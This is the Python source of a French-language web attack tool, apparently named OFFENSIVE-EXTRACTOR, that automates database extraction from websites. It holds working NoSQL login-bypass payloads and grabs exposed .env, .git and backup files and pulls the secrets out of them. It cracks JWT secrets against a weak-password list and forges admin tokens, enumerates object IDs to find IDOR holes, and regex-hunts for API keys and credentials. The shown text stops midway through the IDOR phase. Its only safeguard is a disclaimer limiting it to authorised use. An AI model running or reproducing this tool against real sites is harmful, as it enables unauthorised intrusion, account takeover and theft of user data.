#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OFFENSIVE-EXTRACTOR v1.0
Programme offensif d'extraction de bases de données avec auto-métrique.

Objectif : extraire les données d'un site moderne (avec autorisation).
La réussite (ou l'échec) détermine :
  - La robustesse du site attaqué
  - L'efficacité du programme lui-même

8 vecteurs d'attaque :
  [1] Discovery       — endpoints, swagger, JS parsing, forced browse
  [2] Sensitive files — .git, .env, backups
  [3] Auth bypass     — NoSQL injections
  [4] JWT attacks     — alg:none, secret faible, RS/HS confusion
  [5] IDOR scanner    — /api/users/1..N
  [6] Admin exploit   — endpoints admin avec token
  [7] Services        — MongoDB:27017, Redis:6379, etc.
  [8] Hunt            — secrets, clés API, credentials

Sortie :
  - JSON : données brutes + métriques
  - HTML : rapport double-lecture (site + programme)
  - TXT  : résumé + recommandations

Usage académique / pentest autorisé uniquement.
"""

import os
import sys
import re
import json
import time
import base64
import csv
import socket
import shutil
import argparse
import subprocess
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any, Set
from urllib.parse import urlparse, urljoin, parse_qs
from collections import defaultdict

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

try:
    import jwt as pyjwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

try:
    from pymongo import MongoClient
    PYMONGO_AVAILABLE = True
except ImportError:
    PYMONGO_AVAILABLE = False


# ==================== CONFIGURATION ====================

CONFIG = {
    'timeout': 15,
    'delay': 0.1,
    'user_agent': 'Mozilla/5.0 (X11; Linux x86_64) Offensive-Extractor/1.0',
    'verify_ssl': False,
    'output_dir': './extracted',
    'max_idor_ids': 200,
    'max_brute_paths': 500,
    'sleep_threshold': 4,
    'sleep_test': 5,
    'mode': 'hybrid',  # attack / stealth / hybrid
}

# Marqueurs de succès
SUCCESS_MARKERS = [
    'admin', 'root', 'dashboard', 'welcome', 'token', 'secret',
    'success', 'logged', 'authenticated', 'session', 'access_token',
    'api_key', 'flag{', 'FLAG{', 'HTB{', 'CTF{', 'THM{',
]

NOSQL_ERRORS = [
    'MongoError', 'MongoServerError', 'BSONTypeError', 'CastError',
    'cannot apply', 'unknown operator', '$where', 'E11000',
    'MongoDB', 'mongodb', 'mongoose',
]

# Endpoints admin à tester
ADMIN_ENDPOINTS = [
    '/api/admin/users', '/api/admin/export', '/api/admin/dump',
    '/api/admin/secrets', '/api/admin/config', '/api/admin/settings',
    '/api/admin/logs', '/api/admin/backup', '/api/users/export',
    '/api/export', '/api/dump', '/api/debug', '/api/v1/users',
    '/api/v1/admin', '/api/internal/users', '/api/system/info',
    '/api/users?limit=99999', '/api/v1/users?limit=99999',
    '/users.json', '/api/users.json', '/api/all', '/api/list',
    '/api/data', '/export/users', '/admin/users.json',
]

# Chemins sensibles
SENSITIVE_PATHS = [
    '/.git/config', '/.git/HEAD', '/.git/index', '/.git/logs/HEAD',
    '/.svn/entries', '/.hg/store',
    '/.env', '/.env.local', '/.env.prod', '/.env.backup', '/.env.dev',
    '/config.json', '/config.yml', '/config.yaml', '/settings.json',
    '/appsettings.json', '/web.config', '/app.config',
    '/config.js', '/config.php', '/configuration.php',
    '/docker-compose.yml', '/docker-compose.yaml', '/Dockerfile',
    '/backup.sql', '/backup.zip', '/backup.tar.gz', '/backup.json',
    '/db.sql', '/db.sqlite', '/db.json', '/db.dump', '/database.sql',
    '/database.sqlite', '/database.db', '/dump.sql', '/dump.json',
    '/data.json', '/export.json', '/users.json', '/data/users.json',
    '/db_backup.sql', '/backup_2024.sql', '/backup_2025.sql',
    '/www.zip', '/site.zip', '/source.zip', '/app.zip',
    '/package.json', '/package-lock.json', '/yarn.lock',
    '/composer.json', '/composer.lock', '/requirements.txt',
    '/.gitlab-ci.yml', '/.travis.yml', '/Jenkinsfile',
    '/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml',
    '/api-docs', '/api-docs.json', '/api/swagger.json',
    '/graphql', '/graphiql',
    '/access.log', '/error.log', '/debug.log', '/app.log',
    '/robots.txt', '/sitemap.xml', '/.htaccess', '/.htpasswd',
    '/phpinfo.php', '/info.php', '/test.php',
    '/server-status', '/server-info',
]

IDOR_PATTERNS = [
    '/api/users/{id}', '/api/user/{id}', '/api/users/{id}/profile',
    '/api/orders/{id}', '/api/order/{id}', '/api/documents/{id}',
    '/api/posts/{id}', '/api/messages/{id}', '/api/items/{id}',
    '/api/v1/users/{id}', '/api/v1/user/{id}',
    '/users/{id}', '/user/{id}', '/profile/{id}', '/account/{id}',
    '/api/accounts/{id}', '/api/profile/{id}',
]

# Payloads NoSQL - Version étendue
NOSQL_AUTH_PAYLOADS = {
    'ne_null': {"username": {"$ne": None}, "password": {"$ne": None}},
    'gt_empty': {"username": {"$gt": ""}, "password": {"$gt": ""}},
    'eq_admin_regex': {"username": {"$eq": "admin"}, "password": {"$regex": "^.*"}},
    'in_users': {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$exists": True}},
    'regex_any': {"username": "admin", "password": {"$regex": "^.*"}},
    'exists_pwd': {"username": "admin", "password": {"$exists": True}},
    'where_true': {"username": {"$where": "return true"}, "password": {"$where": "return true"}},
    'not_null': {"username": {"$not": {"$eq": "wrong"}}, "password": {"$not": {"$eq": "wrong"}}},
    'array_admin': {"username": ["admin", "admin"], "password": {"$ne": "invalid"}},
    'type_string': {"username": "admin", "password": {"$type": "string"}},
    'elem_match': {"username": {"$elemMatch": {"$ne": ""}}, "password": {"$ne": ""}},
    'nested_not': {"username": {"$not": {"$type": "null"}}, "password": {"$not": {"$type": "null"}}},
    'regex_dot': {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    'ne_wrong': {"username": {"$ne": "wrong"}, "password": {"$ne": "wrong"}},
    'gte_empty': {"username": {"$gte": ""}, "password": {"$gte": ""}},
}

JWT_WEAK_SECRETS = [
    'secret', 'password', 'jwt', 'jwt_secret', 'jwt-secret',
    'supersecret', 'changeme', 'admin', 'key', 'mykey',
    'secretkey', 's3cr3t', 'test', 'dev', 'development',
    'your-256-bit-secret', 'your_jwt_secret', 'default',
    'qwerty', '12345', 'secret123', 'monkey', 'letmein',
    'iloveyou', 'welcome', 'admin123',
]

HUNT_PATTERNS = {
    'flag': r'[A-Za-z0-9_]+\{[^}]{4,200}\}',
    'aws_key': r'AKIA[0-9A-Z]{16}',
    'github_token': r'ghp_[a-zA-Z0-9]{36}',
    'stripe_key': r'sk_live_[a-zA-Z0-9]{24,}',
    'google_api': r'AIza[0-9A-Za-z\-_]{35}',
    'slack_token': r'xox[baprs]-[a-zA-Z0-9\-]+',
    'private_key': r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
    'jwt': r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
    'mongo_uri': r'mongodb(?:\+srv)?://[^\s"\'<>]+',
    'postgres_uri': r'postgres(?:ql)?://[^\s"\'<>]+',
    'mysql_uri': r'mysql://[^\s"\'<>]+',
    'redis_uri': r'redis://[^\s"\'<>]+',
    'password': r'(?:password|passwd|pwd)["\']?\s*[:=]\s*["\']([^"\']{3,80})["\']',
}


# ==================== MÉTRIQUES ====================

class VectorMetrics:
    """Métriques pour un vecteur d'attaque."""

    def __init__(self, name: str):
        self.name = name
        self.attempts = 0
        self.successes = 0
        self.data_extracted = {}
        self.time_start = None
        self.time_end = None
        self.confidence = 'unknown'  # high / medium / low
        self.failure_reason = None
        self.notes = []
        self.evidence = []

    def start(self):
        self.time_start = time.time()

    def end(self):
        self.time_end = time.time()

    @property
    def duration(self):
        if self.time_start and self.time_end:
            return round(self.time_end - self.time_start, 2)
        return 0.0

    @property
    def success_rate(self):
        if self.attempts == 0:
            return 0.0
        return round(self.successes / self.attempts * 100, 1)

    def to_dict(self):
        return {
            'name': self.name,
            'attempts': self.attempts,
            'successes': self.successes,
            'success_rate': self.success_rate,
            'data_extracted': self.data_extracted,
            'duration': self.duration,
            'confidence': self.confidence,
            'failure_reason': self.failure_reason,
            'notes': self.notes,
            'evidence_count': len(self.evidence),
        }


# ==================== CLASSE PRINCIPALE ====================

class OffensiveExtractor:

    def __init__(self, config: Optional[Dict] = None):
        self.config = dict(CONFIG)
        if config:
            self.config.update(config)

        self.session = self._build_session()
        self.target_url = ""
        self.target_domain = ""
        self.target_host = ""
        self.target_port = None
        self.base_url = ""

        self.results = {
            'target': '',
            'timestamp': datetime.now().isoformat(),
            'mode': self.config['mode'],
            'endpoints': [],
            'sensitive_files': [],
            'git_dump': {'exposed': False},
            'env_leaked': {'found': False, 'content': ''},
            'tokens': [],
            'jwt_findings': [],
            'idor_data': [],
            'admin_data': [],
            'mongo_dumps': [],
            'services_open': [],
            'flags': [],
            'secrets': [],
            'extracted_users': [],
            'extracted_documents': [],
            'errors': [],
        }

        # Métriques par vecteur
        self.metrics = {
            'discovery': VectorMetrics('Discovery'),
            'sensitive_files': VectorMetrics('Fichiers sensibles'),
            'auth_nosql': VectorMetrics('Auth bypass NoSQL'),
            'jwt': VectorMetrics('JWT attacks'),
            'idor': VectorMetrics('IDOR'),
            'admin': VectorMetrics('Admin endpoints'),
            'services': VectorMetrics('Services exposés'),
            'hunt': VectorMetrics('Hunt secrets'),
        }

        self.findings = []
        self.all_requests = []
        self._print_banner()

    # ==================== SESSION HTTP ====================

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        retry = Retry(total=2, backoff_factor=0.3,
                      status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20)
        s.mount('http://', adapter)
        s.mount('https://', adapter)
        s.headers.update({
            'User-Agent': self.config['user_agent'],
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        return s

    def _request(self, url, method='GET', json_data=None, data=None,
                 params=None, headers=None, timeout=None, allow_redirects=True):
        start = time.time()
        info = {
            'url': url, 'method': method, 'status': None,
            'size': 0, 'elapsed': 0.0, 'body': '',
            'content_type': '', 'headers': {}, 'error': None,
        }
        try:
            req_h = dict(self.session.headers)
            if headers:
                req_h.update(headers)

            kwargs = {
                'timeout': timeout or self.config['timeout'],
                'verify': self.config['verify_ssl'],
                'allow_redirects': allow_redirects,
                'headers': req_h,
            }
            if method.upper() == 'POST':
                if json_data is not None:
                    r = self.session.post(url, json=json_data, **kwargs)
                else:
                    r = self.session.post(url, data=data, **kwargs)
            elif method.upper() == 'HEAD':
                r = self.session.head(url, **kwargs)
            else:
                r = self.session.get(url, params=params, **kwargs)

            info['status'] = r.status_code
            info['size'] = len(r.content)
            info['elapsed'] = time.time() - start
            info['content_type'] = r.headers.get('Content-Type', '')
            info['body'] = r.text[:200000]
            info['headers'] = dict(r.headers)

        except requests.exceptions.Timeout:
            info['elapsed'] = time.time() - start
            info['error'] = 'timeout'
        except Exception as e:
            info['elapsed'] = time.time() - start
            info['error'] = str(e)[:200]

        self.all_requests.append({k: v for k, v in info.items()})
        return info

    # ==================== OUTILS ====================

    def _c(self, text, color='white', bold=False):
        colors = {
            'red': '\033[91m', 'green': '\033[92m', 'yellow': '\033[93m',
            'blue': '\033[94m', 'magenta': '\033[95m', 'cyan': '\033[96m',
            'white': '\033[97m', 'bold': '\033[1m', 'end': '\033[0m',
            'dim': '\033[2m',
        }
        b = colors['bold'] if bold else ''
        return f"{colors.get(color, '')}{b}{text}{colors['end']}"

    def _print_banner(self):
        banner = f"""
{self._c('╔══════════════════════════════════════════════════════════════════════════════╗', 'cyan')}
{self._c('║', 'cyan')}  {self._c(' ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗██╗██╗   ██╗███████╗', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('██╔═══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██║██║   ██║██╔════╝', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('██║   ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗██║██║   ██║█████╗  ', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('██║   ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██║╚██╗ ██╔╝██╔══╝  ', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('╚██████╔╝██║     ██║     ███████╗██║ ╚████║███████║██║ ╚████╔╝ ███████╗', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c(' ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝  ╚══════╝', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('     OFFENSIVE-EXTRACTOR v1.0 — JATHNIEL EDITION', 'yellow')}                  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('     🎯 Extraction de DB + Mesure de robustesse (site + outil)', 'green')}    {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('             🛡️  Usage éducatif / pentest autorisé', 'magenta')}              {self._c('║', 'cyan')}
{self._c('╚══════════════════════════════════════════════════════════════════════════════╝', 'cyan')}
        """
        print(banner)

    def _section(self, title):
        print(f"\n{self._c('═' * 78, 'cyan')}")
        print(f"{self._c('▶ ' + title, 'bold')}")
        print(f"{self._c('═' * 78, 'cyan')}")

    def _log_finding(self, category, detail, evidence=None):
        finding = {
            'category': category,
            'detail': detail,
            'evidence': evidence or {},
            'time': datetime.now().isoformat(),
        }
        self.findings.append(finding)
        return finding

    # ==================== PHASE 1 : DISCOVERY ====================

    def phase_1_discovery(self):
        m = self.metrics['discovery']
        m.start()
        self._section("PHASE 1 — DISCOVERY")

        endpoints = set()
        base = self.base_url

        # Swagger / OpenAPI
        swagger_paths = ['/swagger.json', '/openapi.json', '/api-docs',
                         '/api/swagger.json', '/v2/api-docs', '/api-docs.json']
        for sp in swagger_paths:
            m.attempts += 1
            url = urljoin(base, sp)
            info = self._request(url)
            if info['status'] == 200 and info['body']:
                try:
                    spec = json.loads(info['body'])
                    paths = spec.get('paths', {})
                    for p in paths:
                        endpoints.add(p)
                    m.successes += 1
                    print(f"  {self._c('✓', 'green')} Swagger : {sp} ({len(paths)} endpoints)")
                    self.results['sensitive_files'].append({
                        'path': sp, 'url': url, 'size': info['size'], 'type': 'swagger'
                    })
                except Exception:
                    pass
            time.sleep(self.config['delay'])

        # Parse HTML + JS
        m.attempts += 1
        info = self._request(base)
        if info['status'] == 200:
            html = info['body']
            for match in re.finditer(r'["\'](/api/[a-zA-Z0-9_\-/]+)["\']', html):
                endpoints.add(match.group(1))
            for match in re.finditer(r'["\'](/v[0-9]+/[a-zA-Z0-9_\-/]+)["\']', html):
                endpoints.add(match.group(1))

            # JS files
            js_urls = set()
            for m2 in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html):
                js_urls.add(urljoin(base, m2.group(1)))
            for m2 in re.finditer(r'["\'](/static/[^"\']+\.js)["\']', html):
                js_urls.add(urljoin(base, m2.group(1)))
            for m2 in re.finditer(r'["\'](/js/[^"\']+\.js)["\']', html):
                js_urls.add(urljoin(base, m2.group(1)))

            for js_url in list(js_urls)[:30]:
                jinfo = self._request(js_url)
                if jinfo['status'] == 200:
                    for match in re.finditer(r'["\'](/api/[a-zA-Z0-9_\-/{}]+)["\']', jinfo['body']):
                        endpoints.add(match.group(1))
                    for match in re.finditer(r'["\'](/v[0-9]+/[a-zA-Z0-9_\-/{}]+)["\']', jinfo['body']):
                        endpoints.add(match.group(1))
                    for match in re.finditer(
                        r'(?:fetch|axios\.(?:get|post|put|delete))\s*\(\s*["\']([^"\']+)["\']',
                        jinfo['body']
                    ):
                        u = match.group(1)
                        if u.startswith('/'):
                            endpoints.add(u)
                time.sleep(self.config['delay'] * 0.3)

            if endpoints:
                m.successes += 1

        # Forced browse
        for ep in ADMIN_ENDPOINTS:
            m.attempts += 1
            url = urljoin(base, ep)
            info = self._request(url, allow_redirects=False)
            if info['status'] in (200, 401, 403, 500):
                endpoints.add(ep)
                m.successes += 1
            time.sleep(self.config['delay'] * 0.3)

        # IDOR patterns
        for pat in IDOR_PATTERNS:
            endpoints.add(pat)

        self.results['endpoints'] = sorted(endpoints)
        m.data_extracted['endpoints_count'] = len(endpoints)
        m.end()

        if len(endpoints) > 30:
            m.confidence = 'high'
        elif len(endpoints) > 10:
            m.confidence = 'medium'
        else:
            m.confidence = 'low'
            m.failure_reason = 'peu d\'endpoints trouvés — site peut être minimal ou WAF actif'

        print(f"\n  {self._c('✓', 'green')} {len(endpoints)} endpoints découverts "
              f"({m.duration}s)")

        self._log_finding('discovery', f'{len(endpoints)} endpoints trouvés')
        return self.results['endpoints']

    # ==================== PHASE 2 : SENSITIVE FILES ====================

    def phase_2_sensitive_files(self):
        m = self.metrics['sensitive_files']
        m.start()
        self._section("PHASE 2 — FICHIERS SENSIBLES")
        base = self.base_url
        found = []

        for path in SENSITIVE_PATHS:
            m.attempts += 1
            url = urljoin(base, path)
            info = self._request(url, allow_redirects=False)

            if info['status'] == 200:
                body = info['body']
                ct = info['content_type'].lower()

                # Anti-404 custom
                is_404_fake = False
                if 'text/html' in ct and len(body) < 5000:
                    low = body.lower()
                    if 'not found' in low or '404' in low[:200]:
                        is_404_fake = True

                if not is_404_fake:
                    found.append({'path': path, 'url': url, 'size': info['size']})
                    m.successes += 1
                    print(f"  {self._c('🔴', 'red')} [{info['status']}] {path} ({info['size']} o)")
                    self.results['sensitive_files'].append({
                        'path': path, 'url': url, 'size': info['size'],
                        'content_type': ct, 'preview': body[:500],
                    })
                    m.evidence.append({'path': path, 'size': info['size']})

                    if path.endswith('.env') or '.env' in path:
                        self.results['env_leaked'] = {
                            'found': True, 'url': url, 'content': body
                        }
                        self._extract_env_secrets(body)

                    if '.git' in path:
                        self.results['git_dump']['exposed'] = True
                        m.data_extracted['git_exposed'] = True

            elif info['status'] in (401, 403):
                m.attempts -= 1  # compte comme tentative mais pas succès
                m.attempts += 1
                print(f"  {self._c('🟡', 'yellow')} [{info['status']}] {path}")

            time.sleep(self.config['delay'] * 0.3)

        if self.results['git_dump']['exposed']:
            self._dump_git_repo()

        m.data_extracted['files_found'] = len(found)
        m.data_extracted['env_leaked'] = self.results['env_leaked']['found']

        m.end()
        if m.successes > 0:
            m.confidence = 'high'
        else:
            m.confidence = 'high'
            m.failure_reason = 'aucun fichier sensible exposé (site bien configuré)'

        print(f"\n  {self._c('✓', 'green')} {len(found)} fichier(s) trouvé(s) "
              f"({m.duration}s)")
        return found

    def _extract_env_secrets(self, content):
        for line in content.splitlines():
            if '=' in line and not line.strip().startswith('#'):
                k, v = line.split('=', 1)
                k, v = k.strip(), v.strip().strip('"').strip("'")
                if any(x in k.upper() for x in ['DB', 'DATABASE', 'MONGO', 'MYSQL',
                                                  'POSTGRES', 'REDIS', 'SECRET',
                                                  'KEY', 'TOKEN', 'PASSWORD',
                                                  'JWT', 'API']):
                    self.results['secrets'].append({
                        'source': '.env', 'key': k, 'value': v[:200], 'type': 'env_secret'
                    })
                    print(f"      {self._c('🔑', 'yellow')} {k} = {v[:80]}")

    def _dump_git_repo(self):
        print(f"\n  {self._c('🚨', 'red', bold=True)} .git/ exposé → dump...")
        dump_dir = f"{self._output_dir()}/git_dump"
        os.makedirs(dump_dir, exist_ok=True)

        head = self._request(urljoin(self.base_url, '/.git/HEAD'))
        if head['status'] != 200:
            print(f"  {self._c('✗', 'yellow')} .git/HEAD non accessible")
            return

        if shutil.which('git-dumper'):
            try:
                git_url = urljoin(self.base_url, '/.git/')
                subprocess.run(['git-dumper', git_url, dump_dir],
                               timeout=180, check=False,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"  {self._c('✓', 'green')} Repo dumpé dans {dump_dir}")
                self._grep_secrets_in_dir(dump_dir)
                self.metrics['sensitive_files'].data_extracted['git_files'] = len(os.listdir(dump_dir))
            except Exception as e:
                print(f"  {self._c('✗', 'yellow')} git-dumper échec : {e}")
        else:
            print(f"  {self._c('ℹ', 'blue')} git-dumper non installé — dump partiel")
            for path in ['.git/HEAD', '.git/config', '.git/index', '.git/packed-refs']:
                url = urljoin(self.base_url, '/' + path)
                info = self._request(url)
                if info['status'] == 200:
                    fname = path.replace('/', '_')
                    with open(os.path.join(dump_dir, fname), 'w', errors='ignore') as f:
                        f.write(info['body'])
                    print(f"    ✓ {path}")

    def _grep_secrets_in_dir(self, directory):
        for root, _, files in os.walk(directory):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, 'r', errors='ignore') as f:
                        content = f.read()
                    for name, pattern in HUNT_PATTERNS.items():
                        for m in re.findall(pattern, content, re.IGNORECASE):
                            m_str = m if isinstance(m, str) else str(m)
                            self.results['secrets'].append({
                                'source': fpath, 'type': name, 'value': m_str[:300],
                            })
                except Exception:
                    pass

    # ==================== PHASE 3 : AUTH BYPASS ====================

    def phase_3_auth_bypass(self, login_path='/api/login',
                            username_field='username',
                            password_field='password',
                            extra_static=None):
        m = self.metrics['auth_nosql']
        m.start()
        self._section(f"PHASE 3 — AUTH BYPASS NoSQL ({login_path})")
        extra_static = extra_static or {}

        url = urljoin(self.base_url, login_path)

        base_payload = {
            username_field: "nonexistent_user_xyz",
            password_field: "wrong_pass_xyz",
        }
        base_payload.update(extra_static)
        baseline = self._request(url, 'POST', json_data=base_payload)
        print(f"  📏 Baseline : HTTP {baseline['status']} | {baseline['size']}o")

        if baseline['error']:
            m.failure_reason = f'baseline échouée : {baseline["error"]}'
            m.end()
            print(f"  {self._c('✗', 'red')} Baseline échouée")
            return None

        baseline_markers = self._find_markers(baseline['body'])
        baseline_size = baseline['size']
        success_token = None

        for name, base_nosql in NOSQL_AUTH_PAYLOADS.items():
            m.attempts += 1
            payload = {}
            for k, v in base_nosql.items():
                if k == 'username':
                    payload[username_field] = v
                elif k == 'password':
                    payload[password_field] = v
                else:
                    payload[k] = v
            payload.update(extra_static)

            info = self._request(url, 'POST', json_data=payload)
            markers = self._find_markers(info['body'])
            nosql_errors = self._find_nosql_errors(info['body'])

            is_bypass = False
            reasons = []

            if info['status'] == 200 and baseline['status'] != 200:
                is_bypass = True
                reasons.append(f"HTTP {baseline['status']} → 200")
            if info['status'] == 200 and markers and not baseline_markers:
                is_bypass = True
                reasons.append(f"marqueurs: {','.join(markers[:2])}")
            if len(info['body']) > baseline_size * 2 and info['status'] == 200:
                is_bypass = True
                reasons.append(f"taille {baseline_size} → {info['size']}")
            if nosql_errors:
                reasons.append(f"erreur NoSQL: {nosql_errors[0]}")

            marker_str = self._c('🔴', 'red') if is_bypass else '  '
            print(f"  {marker_str} {name:20s} | HTTP {info['status']} | "
                  f"{info['size']:>6}o", end="")
            if reasons:
                print(f" | {self._c(', '.join(reasons[:2]), 'yellow')}")
            else:
                print()

            if is_bypass:
                m.successes += 1
                m.evidence.append({'payload': payload, 'reasons': reasons})
                self._log_finding('auth_bypass', f'Bypass avec {name}',
                                  {'payload': payload, 'reasons': reasons})
                token = self._extract_token(info['body'], info['headers'])
                if token:
                    self.results['tokens'].append({
                        'source': f'auth_bypass:{name}',
                        'token': token,
                        'type': self._detect_token_type(token),
                    })
                    success_token = token
                    m.data_extracted['token_obtained'] = True
                    print(f"      {self._c('🔑', 'green')} Token : {token[:60]}...")

            time.sleep(self.config['delay'])

        m.end()
        if m.successes > 0:
            m.confidence = 'high'
        else:
            m.confidence = 'high'
            m.failure_reason = 'site protégé (sanitization + Mongoose strict)'

        print(f"\n  {self._c('✓', 'green')} {m.successes}/{m.attempts} payload(s) "
              f"réussi(s) ({m.duration}s)")
        return success_token

    def _extract_token(self, body, headers):
        jwt_pattern = r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
        m = re.search(jwt_pattern, body)
        if m:
            return m.group(0)

        try:
            data = json.loads(body)
            for key in ['token', 'access_token', 'accessToken', 'jwt',
                        'session', 'sessionId', 'auth_token']:
                if key in data and isinstance(data[key], str):
                    return data[key]
                if 'data' in data and isinstance(data['data'], dict):
                    for k2 in ['token', 'access_token', 'jwt']:
                        if k2 in data['data'] and isinstance(data['data'][k2], str):
                            return data['data'][k2]
        except Exception:
            pass

        for hname, hval in headers.items():
            if hname.lower() == 'set-cookie':
                m2 = re.search(r'(?:session|token|jwt|auth)=([^;]+)', hval)
                if m2:
                    return m2.group(1)
        return None

    def _detect_token_type(self, token):
        if re.match(r'eyJ[A-Za-z0-9_\-]+\.eyJ', token):
            return 'JWT'
        if len(token) > 30 and all(c.isalnum() or c in '-_' for c in token):
            return 'session_token'
        return 'unknown'

    def _find_markers(self, body):
        low = body.lower()
        return [m for m in SUCCESS_MARKERS if m.lower() in low]

    def _find_nosql_errors(self, body):
        return [e for e in NOSQL_ERRORS if e.lower() in body.lower()]

    # ==================== PHASE 4 : JWT ====================

    def phase_4_jwt_attacks(self):
        m = self.metrics['jwt']
        m.start()
        self._section("PHASE 4 — JWT ATTACKS")

        if not JWT_AVAILABLE:
            m.failure_reason = 'PyJWT non installé'
            m.end()
            print(f"  {self._c('✗', 'yellow')} PyJWT non installé. pip install PyJWT")
            return

        jwts_to_test = [t['token'] for t in self.results['tokens']
                        if t['type'] == 'JWT']

        if not jwts_to_test:
            info = self._request(self.base_url)
            jwts_to_test = re.findall(
                r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
                info['body']
            )
            m.attempts += 1

        if not jwts_to_test:
            m.failure_reason = 'aucun JWT à tester'
            m.end()
            print(f"  {self._c('ℹ', 'blue')} Aucun JWT à tester")
            return

        for jwt_token in jwts_to_test[:5]:
            m.attempts += 1
            try:
                header = pyjwt.get_unverified_header(jwt_token)
                payload = pyjwt.decode(jwt_token, options={"verify_signature": False})

                print(f"\n  JWT trouvé : {jwt_token[:50]}...")
                print(f"    Algo   : {header.get('alg')}")
                print(f"    Claims : {list(payload.keys())}")

                # Test alg:none
                none_header = dict(header)
                none_header['alg'] = 'none'
                none_token = (
                    base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode() + '.' +
                    base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'
                )
                m.notes.append(f'alg:none forgé pour {jwt_token[:20]}')

                # Test secrets faibles
                print(f"    Test {len(JWT_WEAK_SECRETS)} secrets faibles...")
                cracked_secret = None
                for secret in JWT_WEAK_SECRETS:
                    try:
                        pyjwt.decode(jwt_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                        cracked_secret = secret
                        break
                    except Exception:
                        pass

                if cracked_secret:
                    m.successes += 1
                    m.data_extracted['secret_cracked'] = cracked_secret
                    m.evidence.append({'jwt': jwt_token[:50], 'secret': cracked_secret})
                    print(f"    {self._c('💥 SECRET CRACKÉ', 'red', bold=True)} : {cracked_secret}")
                    self._log_finding('jwt_cracked',
                                      f'JWT secret cracké: {cracked_secret}',
                                      {'jwt': jwt_token[:50]})

                    # Forge admin token
                    admin_claims = dict(payload)
                    admin_claims['role'] = 'admin'
                    admin_claims['isAdmin'] = True
                    forged = pyjwt.encode(admin_claims, cracked_secret, algorithm='HS256')
                    self.results['tokens'].append({
                        'source': 'jwt_forged',
                        'token': forged,
                        'type': 'JWT',
                        'note': 'Forge admin'
                    })
                    print(f"    {self._c('🔑', 'green')} Token admin forgé !")
                else:
                    m.failure_reason = 'aucun secret faible trouvé'
                    print(f"    ✗ Aucun secret faible")

                self.results['jwt_findings'].append({
                    'jwt': jwt_token[:100], 'header': header,
                    'payload': payload, 'cracked_secret': cracked_secret,
                })
            except Exception as e:
                print(f"  {self._c('✗', 'yellow')} Erreur JWT : {e}")

        m.end()
        if m.successes > 0:
            m.confidence = 'high'
        else:
            m.confidence = 'medium'
            if not m.failure_reason:
                m.failure_reason = 'secret JWT non trouvé dans la wordlist (peut-être fort)'

        print(f"\n  {self._c('✓', 'green')} {m.successes}/{m.attempts} JWT cassé(s)")

    # ==================== PHASE 5 : IDOR ====================

    def phase_5_idor(self):
        m = self.metrics['idor']
        m.start()
        self._section("PHASE 5 — IDOR SCANNER")

        idor_candidates = []
        for ep in self.results['endpoints']:
            if re.search(r'/\d+', ep):
                continue
            if '{id}' in ep:
                idor_candidates.append(ep)
            elif re.search(r'/api/(?:v\d+/)?(?:users|orders|documents|posts|items|messages|profile|account)s?/?$', ep):
                idor_candidates.append(ep.rstrip('/') + '/{id}')

        if not idor_candidates:
            idor_candidates = IDOR_PATTERNS[:6]

        idor_candidates = idor_candidates[:10]
        auth_headers = self._auth_headers()

        for pattern in idor_candidates:
            print(f"\n  {self._c('ℹ', 'blue')} Test IDOR : {pattern}")
            extracted_objects = []
            errors = 0
            pattern_attempts = 0
            pattern_successes = 0

            max_ids = self.config['max_idor_ids']
            if self.config['mode'] == 'stealth':
                max_ids = 50

            for i in range(1, max_ids + 1):
                pattern_attempts += 1
                m.attempts += 1
                url = urljoin(self.base_url, pattern.replace('{id}', str(i)))
                info = self._request(url, headers=auth_headers)

                if info['status'] == 200 and info['body']:
                    is_json = 'application/json' in info['content_type']
                    is_useful = is_json or any(x in info['body'] for x in ['@', 'user', 'id'])

                    if is_useful:
                        pattern_successes += 1
                        m.successes += 1
                        try:
                            data = json.loads(info['body'])
                            extracted_objects.append({'id': i, 'data': data})
                            if i <= 3 or i % 50 == 0:
                                print(f"    {self._c('🔴', 'red')} ID {i} → {len(info['body'])}o")
                        except Exception:
                            extracted_objects.append({'id': i, 'data': info['body'][:2000]})
